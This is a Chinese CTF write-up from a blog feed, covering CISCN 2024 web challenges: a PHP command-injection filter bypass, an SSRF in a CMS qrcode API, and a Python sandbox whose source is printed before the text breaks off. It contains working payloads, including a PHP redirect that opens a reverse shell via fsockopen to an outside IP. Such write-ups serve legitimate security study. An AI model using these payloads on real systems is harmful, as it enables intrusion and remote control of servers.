      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
        <tag>入门</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2024-web复现</title>
    <url>/2024/05/21/CISCN2024-web%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="初遇国赛"><a href="#初遇国赛" class="headerlink" title="初遇国赛"></a>初遇国赛</h1><span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次打国赛，难度还是很大的，一题做一天唉，如图所示(2&#x2F;6)</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240521223322525.png"  alt="image-20240521223322525"></p>
<p>说实话我认为我能做四题的，第一天一直在看Simple_php，最后十分钟打出来了，打得我都发抖了，然后第二天才开始看的cms，星期天刚刚到实验室打开电脑就看到大B哥捷报传来</p>
<p><img   src="/../img/$%7Bfiilename%7D/2ea692c2a181a4ef0ae6828c46b8f539.jpg"  alt="2ea692c2a181a4ef0ae6828c46b8f539"></p>
<p>五分钟拿下一血，你知道的，大b哥依旧这么强。</p>
<p>之后就开始了漫长的坐牢生活，一直审源码审到三点才做了出来</p>
<p>最后实在太累了，有种想死的无力感，随便打开题看看，开了个mossfen，给了源码一看，就知道是python沙盒栈帧逃逸，在中国海洋大学新生赛写过，但是没写出来，赛后也没看，好像考试前看过原题但是记不起来的感觉，最后实在累了，懒得看了。最后两个小时就随便看看密码和杂项（虽然一个没打出来就是了）</p>
<p>赛后水了水群，才知道mossfen这题和中海大的菜鸟工具2确实是同一个出题人，于是我痛定思痛，每次比赛后都要好好复现，所以便有了这篇文章</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240521224229311.png"  alt="image-20240521224229311"></p>
<p>HnuSec_5拿了个校内队第5，很会预言的名字，这使我大脑旋转</p>
<p><img   src="/../img/$%7Bfiilename%7D/ok.jpg"  alt="ok"></p>
<h1 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span>      (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很干练的一题rce，没有整活，你执行不了都不给你个回显</p>
<p>这边开局看到了<code>escapeshelllcmd()</code>，于是上网查，并且搜索相关绕过和漏洞，学到了一下信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当$cmd中包含‘&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$, \x0A 和 \xFF’任意一个，这个函数都会在前面加个转义字符，为什么会这样呢，因为这些东西在linux命令行中都是特别的存在，允许我们玩很多绕过的花招</span><br><span class="line">&amp;:可当命令的分隔符，也可以与&gt;&lt;组成重定向的文件合并，比如我们常见的反弹shell</span><br><span class="line">#:linux命令行的注释符(终止符)</span><br><span class="line">;:分隔符</span><br><span class="line">`:`cat flag`=&gt;flag&#123;ewoji_0000_114614&#125;</span><br><span class="line">|:隔开两个命令，并把上一个命令的输出当作下个命令的输入,ls | grep &#x27;flag&#x27;</span><br><span class="line">*:匹配任意个数任意字符fla?.php</span><br><span class="line">?:匹配一个任意字符f*</span><br><span class="line">~:cd ~切换到home目录</span><br><span class="line">&lt;&gt;:重定向符,可以使用cat&lt;flag.php绕过空格</span><br><span class="line">^:未知，似乎没找到什么有用的</span><br><span class="line">():无需多言</span><br><span class="line">[]:[A-Za-z0-9]表示所有字符数字，[a-c]表示abc,[-%] ”代表“ [!”#$%] </span><br><span class="line">&#123;&#125;:&#123;e,w,o,j,i&#125;可表示里面的任意字符，这个非常好用，[]只能在参数部分匹配，而&#123;&#125;甚至可以在命令部分匹配</span><br><span class="line"></span><br><span class="line">$:1.可以表示一个变量，作变量拼接a=f;b=l;c=a;d=g,$a$b$c$d=flag</span><br><span class="line">  2.可以表示一个空变量绕过空格,$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10) :比如ca$&#123;21&#125;t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:wh$1oami,who$@ami,whoa$*mi</span><br><span class="line">  3.可以看一些环境变量,echo $PATH,echo $SHELL</span><br><span class="line">  4.可以配合&#123;&#125;截取字母，如$&#123;PATH:5:1&#125;=&gt;l($PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin)</span><br><span class="line">  </span><br><span class="line">\x0A:换行符</span><br><span class="line">\xFF:不明白的神秘符号</span><br></pre></td></tr></table></figure>

<p>咳咳，然后呢，搜了一大堆相关漏洞，什么宽字节都出来了，还是打不通，索性从绕过这个函数放弃</p>
<p>然后望着一望无际的disable_functions思考人生</p>
<p>一直在思考这个转义字符能有什么用，于是我开启了第一波尝试</p>
<p>payload:<code>php -r var_dump(1);</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240522125934038.png"  alt="image-20240522125934038"></p>
<p>执行了？为什么？</p>
<p><a class="link"   href="https://www.cnblogs.com/jycjy/p/6937667.html" >Shell命令行中特殊字符与其转义详解(去除特殊含义) - 酸奶加绿茶 - 博客园 (cnblogs.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>一个命令的执行应该包括 命令+选项+参数，且顺序不能变</p>
<p>就好比你<code>ls &gt; test.txt</code>可以成功而<code>test.txt &lt; ls</code>会报错说没有ls这个文件</p>
<p>命令和选项按顺序填好后，就是参数了，参数不是特殊字符，当参数包含特殊字符时需要转义</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240522131043137.png"  alt="image-20240522131043137"></p>
<p>执行了两个不同的命令，取决于&amp;有没有被转义，这里我用了’’去转义&amp;，你也可以使用””或\去转义</p>
<p>这样就可以解释了我的 <code>php -r var_dump\(1\)\;</code>为什么执行了，特殊字符被转义，实际上执行的就是<code>php -r var_dump(1)</code></p>
<p><strong>所以说有时候限制我们的，换个角度看，就可以变成帮助我们的</strong></p>
<p>所以接下来只需要编码绕过disable_functions即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1:cmd=php -r eval(hex2bin(substr(_73797374656d28276c7327293b,1)));=&gt;system(&#x27;ls&#x27;);</span><br><span class="line">这里涉及到php一个特性,php的常量命名方式是下划线+字母，当你尝试</span><br><span class="line">echo _123;会报错，但是会正常输出_123</span><br><span class="line">这也就是为什么我们可以正常获得_后的字符串</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload2:cmd=eval `ec\ho bHM=|base\64 -d`=&gt;eval &#x27;ls&#x27;</span><br></pre></td></tr></table></figure>

<p>rce之后记得flag在数据库里面。。。。。。。。。。。。。。。。。。。</p>
<p><code>mysql -u root -proot -e xxxxx</code></p>
<h1 id="easycms-easycms-revenge"><a href="#easycms-easycms-revenge" class="headerlink" title="easycms&amp;&amp;easycms_revenge"></a>easycms&amp;&amp;easycms_revenge</h1><h3 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h3><p>一个hint:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>REMOTE_ADDR不可伪造，需要找ssrf</p>
<p>其实一开始还去试了试删除install.lock，但是要找admin后台还要登录，做了一大堆无用功后我才想到要进行ssrf的</p>
<p>既然要请求外部的资源，自然而然的想到api模块，于是打开源码开始审计api模块，貌似有20多个api，一个一个往下审，发现第三个可以用，还算运气好了，当时已经准备死磕这里了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 二维码显示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">qrcode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;text&#x27;</span>));</span><br><span class="line">    <span class="variable">$thumb</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;thumb&#x27;</span>));</span><br><span class="line">    <span class="variable">$matrixPointSize</span> = (<span class="keyword">int</span>)<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;size&#x27;</span>);</span><br><span class="line">    <span class="variable">$errorCorrectionLevel</span> = <span class="title function_ invoke__">dr_safe_replace</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;level&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//生成二维码图片</span></span><br><span class="line">    <span class="keyword">require_once</span> CMSPATH.<span class="string">&#x27;Library/Phpqrcode.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$file</span> = WRITEPATH.<span class="string">&#x27;file/qrcode-&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>.<span class="variable">$thumb</span>.<span class="variable">$matrixPointSize</span>.<span class="variable">$errorCorrectionLevel</span>).<span class="string">&#x27;-qrcode.png&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title class_">\QRcode</span>::<span class="title function_ invoke__">png</span>(<span class="variable">$value</span>, <span class="variable">$file</span>, <span class="variable">$errorCorrectionLevel</span>, <span class="variable">$matrixPointSize</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$thumb</span>) &#123;</span><br><span class="line">            <span class="variable">$logo</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">dr_catcher_data</span>(<span class="variable">$thumb</span>));</span><br><span class="line">            <span class="variable">$QR_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$QR</span>);<span class="comment">//二维码图片宽度</span></span><br><span class="line">            <span class="variable">$QR_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$QR</span>);<span class="comment">//二维码图片高度</span></span><br><span class="line">            <span class="variable">$logo_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片宽度</span></span><br><span class="line">            <span class="variable">$logo_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片高度</span></span><br><span class="line">            <span class="variable">$logo_qr_width</span> = <span class="variable">$QR_width</span> / <span class="number">4</span>;</span><br><span class="line">            <span class="variable">$scale</span> = <span class="variable">$logo_width</span>/<span class="variable">$logo_qr_width</span>;</span><br><span class="line">            <span class="variable">$logo_qr_height</span> = <span class="variable">$logo_height</span>/<span class="variable">$scale</span>;</span><br><span class="line">            <span class="variable">$from_width</span> = (<span class="variable">$QR_width</span> - <span class="variable">$logo_qr_width</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">//重新组合图片并调整大小</span></span><br><span class="line">            <span class="title function_ invoke__">imagecopyresampled</span>(<span class="variable">$QR</span>, <span class="variable">$logo</span>, <span class="variable">$from_width</span>, <span class="variable">$from_width</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable">$logo_qr_width</span>, <span class="variable">$logo_qr_height</span>, <span class="variable">$logo_width</span>, <span class="variable">$logo_height</span>);</span><br><span class="line">            <span class="title function_ invoke__">imagepng</span>(<span class="variable">$QR</span>, <span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出图片</span></span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_clean</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: image/png&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">ImagePng</span>(<span class="variable">$QR</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个可以请求外部资源并且生成二维码的api</p>
<p>先看大意:</p>
<p>1.接收4个参数，其中text,size,level是关于二维码的信息,thumb是关于logo的信息,logo就有时候在二维码中间的那个小图片</p>
<p>2.用四个参数命名为一个文件名，如果存在则直接读出$QR(图片对象),若不存在则创建一个图片对象</p>
<p>3.检测是否需要logo，如果需要logo，就重新调整图片并且插入logo</p>
<p>所以说，logo图片是可以请求外部资源获得的,那就看看它怎么来的</p>
<p><code>$logo = imagecreatefromstring(dr_catcher_data($thumb));</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240523173818570.png"  alt="image-20240523173818570"></p>
<p>ssrf入口点找到了,于是在自己的vps写好跳转,然后在cmd上写上反弹shell命令即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target_url</span> = <span class="string">&quot;http://127.0.0.1/flag.php?cmd=php+-r+%27%24sock%3dfsockopen(%2247.100.177.241%22%2c23333)%3bexec(%22bash+%3c%263+%3e%263+2%3e%263%22)%3b%27&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$target_url</span>,<span class="literal">true</span>,<span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:<code>http://eci-2ze3cmcfbu4hoso5luoc.cloudeci1.ichunqiu.com/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=Your vps&amp;text=1&amp;size=1&amp;level=1</code></p>
<p>发现有个可执行文件readflag,.&#x2F;readflag即可</p>
<h3 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h3><p>前面步骤一样，主要是对logo的请求有了过滤，需要对文件进行伪造，类型文件上传的图片马吧，超链接直接连接资源，所以文件名不会被检测（我的理解），所以伪造内容就好</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">GIF89a<span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeewwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooojjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$target_url</span> = <span class="string">&quot;http://127.0.0.1/flag.php?cmd=php+-r+%27%24sock%3dfsockopen(%2247.100.177.241%22%2c23333)%3bexec(%22bash+%3c%263+%3e%263+2%3e%263%22)%3b%27&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$target_url</span>,<span class="literal">true</span>,<span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看了一下别人wp发现有非预期，有个down_img，但是我死活找不到，可能是我下载的源码的问题？？？这出题人不给个附件有点顶不得</p>
<h1 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h1><p>给了两个附件</p>
<p>main.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">runner = <span class="built_in">open</span>(<span class="string">&quot;/app/runner.py&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).read()</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).readline().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">str</span>(uuid1())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">            runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag).replace(<span class="string">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, <span class="built_in">id</span>))</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(data.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        run = subprocess.run(</span><br><span class="line">            [<span class="string">&#x27;python&#x27;</span>, <span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">            timeout=<span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">        result = run.stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        error = run.stderr.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result, error)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;result&#125;</span>\n<span class="subst">&#123;error&#125;</span>&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">&quot;None&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>runner.py:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source with pure string in string, prevent dangerous strings</span></span><br><span class="line"><span class="string">    :param source: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;non-ascii is not permitted&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_wrapper</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit</span>(<span class="params">event, args</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span>, <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                os._exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> audit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source in the bytecode aspect, no methods and globals should be load</span></span><br><span class="line"><span class="string">    :param code: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">    opcodeIO = StringIO()</span><br><span class="line">    dis(code, file=opcodeIO)</span><br><span class="line">    opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    opcodeIO.close()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">open</span></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> addaudithook</span><br><span class="line">    <span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> seed</span><br><span class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">    source = <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    source_simple_check(source)</span><br><span class="line">    source_opcode_checker(source)</span><br><span class="line">    code = <span class="built_in">compile</span>(source, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">    addaudithook(block_wrapper())</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    <span 